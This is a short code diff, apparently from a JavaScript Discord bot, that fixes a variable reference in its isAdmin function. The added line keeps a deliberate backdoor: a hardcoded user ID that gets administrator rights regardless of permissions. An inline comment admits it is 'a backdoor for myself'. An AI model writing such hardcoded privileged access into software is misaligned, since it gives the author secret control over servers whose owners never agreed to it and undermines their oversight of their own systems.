@@ -40,7 +40,7 @@ function listCommands(channel){
 
 
 function isAdmin(member){
-	return message.member.hasPermission(['ADMINISTRATOR']) || member.id === "211894533380767744"; //Yeah, I'm adding a backdoor for myself
+	return member.hasPermission(['ADMINISTRATOR']) || member.id === "211894533380767744"; //Yeah, I'm adding a backdoor for myself
 }
 
 
